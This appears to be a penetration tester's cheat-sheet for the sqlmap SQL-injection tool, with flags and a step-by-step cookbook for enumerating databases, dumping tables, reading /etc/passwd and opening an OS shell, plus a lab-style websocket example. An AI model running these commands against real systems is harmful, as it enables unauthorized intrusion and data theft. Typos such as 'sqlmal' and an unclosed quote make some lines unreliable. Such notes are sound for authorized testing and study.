# sqlmap

## Overview

SQLMap is a free and open-source penetration testing tool written in Python that automates the process of detecting and exploiting SQL injection (SQLi) flaws. SQLMap has been continuously developed since 2006 and is still maintained today.

## Installation

	sudo apt install sqlmap
or
	git clone https://github.com/sqlmapproject/sqlmap.git


## Command Options

sqlmap

	-h, --help			Show basic help message and exit
	-hh			Show advanced help message and exit
	-u URL, --url=URL			Target URL
	-p <injection_point>		Selects a specific injection point
	-o - Chose all optimizations available

	-D <database_name>		Scans for a specific database
	-T <table_name>		Scans for a specific table

	--threads <threads>		Max of 10 threads
	--batch			Used for skipping any required user-input, by automatically choosing using the default option
	--dump			Dumps DBMS database table entries
	--baner		Retrieves dbms banner
	--dbms <dbms_name>		Use only sqli for a specifc dbms
	--os-shell		Try to get a remote shell on the server
	--is-dba		Check if we can get db admin priveledges
	--flush-session	Deletes the records for the current session scan and starts from the beginning
	--crawl <depth>	Crawl the website starting from the target URL
	--os-shell		Tries creating a shell on the server


## Usage Examples

sqlmap -u <address> --dump --batch
sqlmap -r <request_file_path> --dump --batch

if we dont find anything increase risk and level

sqlmap -r <request_file_path> --dump --batch --risk 3

sqlmap -r <request_file_path> --dump --batch --level 5

sqlmap -r <request_file_path> --dump --batch --level 5 --risk 3

Injection on a specific field

sqlmap -r <request_file_path> --batch -p <injection_field_name>

## Cookbook

Start by doing a simple scan without the Time technique:

	sqlmap -r <request> --technique "BEUSQ" --banner --dbs --current-user --current-db --users --roles
	Don't use --batch on the first scan
	Don't use --threads on the first scan

When increasing the level try it also without the time technique:

```shell

sqlmap -r <request> --technique "BEUSQ" --batch --level 5 --risk 3 --threads 10
```

Check the priviledges of the db user (we might be able to create a shell or read files):

```shell
sqlmap -r <request> -p <injectable_parameter> --privileges

#if we have file read privileges we can do so with:

sqlmap -r <request> -p <injectable_parameter> --file-read=/etc/passwd
```

Try creating a shell after finding an injection

	sqlmap -r <request> --os-shell

Start by doing a basic scan of the dbms, to get some basic info

	sqlmap -r <> --batch --banner

Then add the dbms flag, and enum the dbs, users and roles

	sqlmap -r <> --batch --dbms=<dbms_name> -dbs --current-user --current-db --users --roles --threads 10

Then pick a db and enum the tables

	sqlmap -r <> --batch --dbms=<> -D <db_name> --tables

Then dump a specific table:

```shell
sqlmal -r <request> --threads 10 --batch --dbms=<database_magement> -D <database_name> -T <table_name> --dump
```

## Sqlmap and websockets

Let's say that there is a websocket running on ws://soc-player.soccer.htb:9091/, and to this endpoint we send a json data of {"id":"1000"}, we can use sqlmap to inject the id parameter.

```
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"} --batch
```


## More Information

https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
https://github.com/sqlmapproject/sqlmap/wiki/Usage